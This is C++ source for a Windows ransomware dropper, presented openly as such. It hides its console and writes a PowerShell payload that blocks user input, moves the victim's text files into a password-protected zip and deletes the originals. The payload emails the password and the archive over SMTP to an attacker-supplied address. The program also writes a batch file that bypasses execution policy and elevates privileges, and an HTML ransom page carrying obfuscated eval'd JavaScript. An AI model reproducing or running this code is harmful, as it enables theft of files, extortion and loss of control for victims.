#include <iostream>
#include <fstream>
#include <cstdlib>
#include <Windows.h>

using namespace std;  
void StealthMode();

//PS1 file
const char *ps =
  "$code = @\"\n"
    "\t[DllImport(\"user32.dll\")]\n"
    "\tpublic static extern bool BlockInput(bool fBlockIt);\n\""
"@ \n"

"$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru\n"
"$userInput::BlockInput($true) \n"

"$workdir = \"c:\\installer\\ \" \n"

"If (Test-Path -Path $workdir -PathType Container) \n"
"{ Write-Host \"$workdir already exists\" -ForegroundColor Red} \n"
"ELSE\n"
"{ New-Item -Path $workdir  -ItemType directory }\n"
"$source = \"http://www.7-zip.org/a/7z1604-x64.msi\" \n"
"$destination = \"$workdir\\7-Zip.msi\" \n"

"if (Get-Command 'Invoke-Webrequest')\n"
"{\n"
     "\tInvoke-WebRequest $source -OutFile $destination\n"
"}\n"
"else\n"
"{\n"
    "\t$WebClient = New-Object System.Net.WebClient\n"
    "\t$webclient.DownloadFile($source, $destination)\n"
"}\n"
"Invoke-WebRequest $source -OutFile $destination\n"
"msiexec.exe /i \"$workdir\\7-Zip.msi\" /qb\n"
"Start-Sleep -s 10\n"
"rm -Force $workdir\7* \n"
"$Source = \"C:\\Users\\(username)\\Desktop\\StealableFiles\" \n" 
"$Destination = \"C:\\Users\\(username)\\Desktop\\StolenFiles\" \n"
"$cp = robocopy /mov $Source $Destination *.txt /s \n"
"[Reflection.Assembly]::LoadWithPartialName(\"System.Web\")\n"
"$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)\n"
"$pathTo64Bit7Zip = \"C:\\Program Files\\7-Zip\\7z.exe\" \n"
"$arguments = \"a -tzip \"\"$Destination\"\" \"\"$Destination\"\" -mx9 -p$randomPassword\" \n"
"$windowStyle = \"Normal\" \n"
"$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle\n"
"$del = Remove-Item $Destination -Force -Recurse\n"
"$email = \"(enter email address you want files sent to)\"\n"

"$SMTPServer = \"smtp.example.net\"\n"
"$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)\n"
"$From = $email\n"
"$To = $email\n"
"$Subject = \"$Destination Password $(get-date -f yyyy-MM-dd)\"\n"
"$Body =  $randomPassword\n"
"$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)\n"
"$Msg.IsBodyHTML = $False\n"
"$Mailer.send($Msg)\n"
"$Msg.Dispose()\n"
"$Mailer.Dispose()\n"

"$ZipFolder = \"C:\\Users\\(username)\\Desktop\\StolenFiles.zip\"\n"
"$SMTPServer = \"smtp.example.net\"\n"
"$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)\n"
"$From = $email\n"
"$To = $email\n"
"$Subject = \"$Destination Content $(get-date -f yyyy-MM-dd)\"\n"
"$Body = \"Zip Attached\"\n"
"$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)\n"
"$Msg.IsBodyHTML = $False\n"
"$Attachment = new-object Net.Mail.Attachment($ZipFolder)\n"
"$Msg.attachments.add($Attachment)\n"
"$Mailer.send($Msg)\n"
"$Attachment.Dispose()\n"
"$Msg.Dispose()\n"
"$Mailer.Dispose()\n"

"$del = Remove-Item $ZipFolder -Force -Recurse \n"

"$userInput::BlockInput($false)\n"

"Add-Type -AssemblyName System.Windows.Forms\n";           

//BAT file
const char *bat = "rem Bypass PowerShell execution policy \n"
"@ECHO OFF \n"
"PowerShell.exe -windowstyle hidden -NoProfile -Command \"& {Start-Process PowerShell.exe -windowstyle hidden -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -File \"\"%~dpn0.ps1\"\"\' -Verb RunAs}\" \n"
"EXIT";

//ATTENTION file
const char *html = "<html><head></head><body><script type=\"text/javascript\">eval(unescape(\'%66%75%6e%63%74%69%6f%6e%20%61%38%38%36%39%33%35%65%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%37%30%39%34%34%30%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%36%36%37%34%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a\'));eval(unescape(\'%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%61%38%38%36%39%33%35%65%28%27') + '%3b%2a%42%51%45%53%5d%55%41%24%6d%72%6f%6b%49%3a%6a%76%6a%68%47%38%6c%60%67%66%45%37%72%6b%76%6b%61%47%52%45%57%51%51%4a%50%47%54%47%3b%37%71%6d%70%69%63%40%3b%38%6e%67%63%63%46%39%62%77%61%7f%40%3b%7c%7c%69%22%7c%6d%61%70%6c%38%20%37%3f%3b%20%22%6a%62%6d%6e%6c%70%38%20%36%37%3b%20%40%3e%6c%46%39%72%61%62%72%22%7f%36%20%2f%33%21%24%7c%39%22%28%37%24%27%70%6f%66%76%6f%39%23%31%3c%35%20%22%6f%6e%6f%69%6a%73%39%23%30%34%35%20%22%6e%6f%3b%24%65%66%76%7f%65%73%66%60%63%60%64%6d%74%71%72%76%61%22%24%6f%6f%6e%6b%36%20%25%32%37%34%35%34%34%23%35%40%3b%60%26%6b%66%3a%22%62%65%76%7f%67%75%4c%7d%6f%66%24%27%60%6c%73%74%69%67%7b%3a%2d%74%71%70%62%22%47%38%72%60%61%76%27%62%62%3f%24%70%7e%6e%67%32%23%26%79%6e%6f%72%6a%3f%21%35%35%34%21%23%26%6a%62%62%6d%6a%76%3a%22%34%34%34%20%20%22%7f%36%20%32%24%27%7d%38%22%34%23%26%75%73%7d%75%6d%67%2a%7f%6c%60%70%6d%3b%24%37%2d%26%68%6b%6b%68%38%22%71%73%6a%2a%20%60%70%6b%66%77%65%71%70%61%73%74%2b%21%38%44%3e%31%6c%46%39%37%6f%47%3a%69%45%37%72%6b%76%6b%61%47%48%65%7c%63%74%27%3a%3a%31%76%6e%70%69%61%46%39%72%67%7f%7f%26%68%6b%6b%68%38%22%23%6f%30%32%37%3b%36%24%22%70%70%73%77%6b%60%3b%24%20%3b%36%32%24%27%73%71%72%77%6a%63%2f%7c%62%62%76%6a%3a%22%35%22%24%7d%3b%24%36%3a%36%30%38%3d%30%35%3e%22%25%7f%3f%21%3e%36%24%22%6e%60%38%22%73%7f%6d%61%36%2d%26%68%71%75%70%28%73%6d%7b%63%3f%21%3d%32%24%22%6d%77%77%70%29%6f%67%6f%6e%67%7f%3f%24%2c%50%6c%69%61%72%26%50%62%70%26%54%71%6a%65%77%2f%28%25%52%6b%6a%6e%71%2e%22%70%61%73%6d%6e%23%26%76%62%73%72%2f%63%75%63%6d%77%72%38%20%75%73%6a%70%76%24%27%7c%68%68%3a%72%76%63%60%6e%3b%24%72%71%61%72%61%72%7f%63%24%45%2a%26%5b%51%52%52%25%4e%4d%49%43%22%46%5d%43%22%47%55%43%53%5d%54%51%43%46%27%2a%3a%31%76%62%7c%71%46%38%71%63%7a%73%2b%6c%6b%6e%6b%39%23%23%6e%6f%6c%68%6d%61%20%22%75%73%72%76%6b%61%28%7d%6b%63%7f%6e%3f%24%37%22%25%7c%39%23%30%35%35%3d%3f%33%36%3d%22%25%7d%39%23%37%32%3d%39%3d%33%3a%30%31%23%24%6d%61%3b%24%70%71%6d%61%36%21%24%6f%77%76%71%2b%75%6e%75%63%3f%24%36%3e%23%24%6e%76%74%76%2a%61%67%6f%6b%6b%7d%38%22%2f%51%6f%6f%62%7c%26%50%67%7c%24%53%77%69%64%74%29%2b%2b%52%6b%6f%62%73%29%24%73%60%70%6b%6d%2d%26%76%67%7f%70%28%65%76%62%6e%71%71%36%20%75%76%66%72%71%22%24%7d%6b%6e%39%7c%76%63%65%62%39%23%74%72%60%71%67%71%71%63%24%22%73%72%64%76%73%6f%75%74%6a%36%20%6f%63%73%72%6c%7c%2c%34%2a%32%2b%3b%2a%33%30%30%3e%3d%32%3d%33%32%37%37%32%36%36%3a%33%3e%33%28%34%29%2b%34%3e%39%37%32%32%3f%31%3d%35%3d%34%36%34%3f%3d%31%39%2b%27%22%25%73%70%73%75%6d%62%36%20%25%32%37%34%23%46%5d%76%73%74%27%61%6f%6e%67%70%24%6d%65%7e%60%26%64%62%6e%74%22%67%75%63%73%7d%74%71%63%66%35%2b%51%67%70%63%24%21%24%31%35%26%79%74%7d%72%6a%22%74%6e%25%62%6d%71%61%71%6e%79%71%22%76%74%24%71%6c%61%25%60%6b%73%6c%75%6b%70%27%65%62%63%77%70%74%76%35%37%35%76%67%7f%70%47%38%70%60%7e%76%27%61%6f%6e%6e%3a%22%22%6e%6e%6f%6c%68%6d%2d%26%75%76%71%77%6a%61%39%23%21%32%37%3b%20%22%75%73%72%76%6b%61%28%7d%6b%63%7f%6e%3f%24%37%22%25%73%70%73%75%6d%62%26%75%72%63%60%6d%71%7d%39%23%74%77%6b%67%20%22%68%6e%68%69%29%77%75%67%65%6e%7f%7f%3f%24%75%71%69%68%22%25%7e%3f%21%3f%3f%30%34%3d%3f%32%3d%22%25%7f%3f%21%3a%32%36%30%3e%32%30%35%22%25%6f%66%3a%2d%71%78%69%64%3e%23%24%6e%76%74%76%2a%7c%6f%7c%67%3a%22%34%3e%22%25%6c%71%75%7f%2b%68%63%6a%6d%69%7d%39%23%2d%56%6e%66%63%75%22%55%61%7e%24%52%76%6b%63%75%20%2a%22%56%6e%69%60%73%28%25%71%67%71%62%6c%24%22%73%61%7d%70%29%64%74%65%6f%78%70%3f%24%70%70%64%72%70%23%26%7a%6a%67%38%75%72%66%63%60%39%22%75%70%67%70%6e%70%78%67%21%46%4c%24%74%73%75%78%6e%6f%63%22%64%62%68%76%7f%24%71%75%22%6c%6e%72%22%76%6f%61%6c%72%24%6f%6f%6e%62%7c%26%64%63%60%6b%37%24%4d%77%26%74%62%7f%73%74%70%2b%24%7e%61%24%7e%6f%6e%6b%2b%6d%6b%78%62%24%71%6c%61%25%76%63%70%7c%7d%71%74%63%36%39%37%70%60%7e%76%45%37%72%67%7a%73%24%6f%6d%68%69%3b%24%20%61%6c%68%68%6d%6e%23%24%73%71%70%71%68%6e%3b%24%25%37%34%35%22%24%72%72%74%74%64%63%2f%79%6e%60%71%6c%39%23%36%24%27%7c%72%74%71%68%61%28%77%74%64%61%6b%73%72%3b%24%70%72%68%69%22%24%6f%6f%6e%6b%26%75%72%63%60%6d%71%7d%39%23%74%77%6b%67%20%22%7a%3a%22%32%34%22%25%7f%3f%21%3c%33%39%30%3f%35%33%3d%32%23%26%6b%63%36%20%75%78%6c%67%3e%22%24%6f%75%70%73%26%71%6b%7c%62%39%23%35%3e%23%26%68%74%79%72%2f%68%66%69%6c%68%7d%38%20%29%53%62%6b%67%75%27%56%60%7f%24%53%75%6f%66%79%2d%2e%22%53%6d%68%61%73%29%26%75%62%7d%6f%68%24%27%70%60%7c%70%28%67%70%60%63%75%74%3f%21%73%71%65%72%71%20%22%7f%66%6a%3c%75%77%65%62%61%39%23%76%74%62%7c%63%74%78%62%22%47%5d%57%50%50%22%4e%4f%38%22%36%61%30%3c%30%61%31%3d%34%37%3f%6c%36%38%31%34%31%3c%30%34%32%35%33%6d%32%37%37%31%38%36%70%61%7d%72%40%3b%7f%63%7a%76%27%6e%6c%68%68%38%20%25%6d%61%6c%68%68%6d%22%25%73%70%73%75%6d%62%36%20%25%32%37%34%23%24%73%71%70%71%68%6e%2b%79%6b%63%70%6d%39%22%35%20%22%70%7f%70%71%6d%62%29%76%74%65%62%6f%76%7e%36%20%70%77%6b%68%23%24%6e%6c%6a%6e%2a%78%76%63%65%6e%70%7c%39%22%77%73%6e%6b%2d%26%7a%3f%21%32%3c%36%31%3c%3c%36%33%2d%26%7b%3f%21%33%32%34%36%33%3c%35%36%32%20%22%6b%63%39%23%73%7e%6e%65%3a%21%2b%6c%71%70%73%29%72%6d%7a%60%3b%24%36%31%20%22%68%74%76%71%29%6e%64%6b%6b%6b%72%3b%24%29%53%6d%68%61%73%25%54%67%7c%2b%50%71%6f%66%76%2e%28%24%51%6f%6f%62%7c%2a%22%75%62%72%6c%6e%22%25%72%67%7f%7f%2b%63%70%60%6c%76%72%39%23%71%76%66%7d%72%24%22%7f%69%69%3a%73%75%67%65%62%36%20%72%74%62%73%60%72%7e%60%20%40%41%62%72%65%71%6e%76%25%65%63%62%75%77%75%7f%38%22%7a%7f%7c%7d%7c%7c%7d%7e%7a%7f%73%7e%7a%7a%7f%7c%7d%7c%7c%7d%7e%7a%7f%37%35%76%67%7f%70%47%38%37%6e%44%3e%34%7c%7c%69%40%3b%37%63%77%60%7c%44%3e%34%63%72%6f%6e%4517094400%35%39%34%30%30%35%36\' + unescape(\'%27%29%29%3b\'));</script><noscript><i>Javascript required</i></noscript></html>";

//Hidden function
void StealthMode(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}
int main(){	

	StealthMode();
  	//PS1 file creat
  	ofstream pswrite("ransomware.ps1");
  	pswrite << ps;
  	pswrite.close();
  	//bat file creat
  	ofstream batwrite("ransomware.bat");
  	batwrite << bat;
  	batwrite.close();
  	//html file creat
  	ofstream htmlwrite("attention.html");
  	htmlwrite << html;
  	htmlwrite.close();
  	//settings and start main app
  	system("ransomware.bat");
  	system("ransomware.ps1");
  	//delete file
  	remove("ransomware.ps1");
  	remove("ransomware.bat");
  	//attention file start
  	system("attention.html");
  	
  return 0;
}
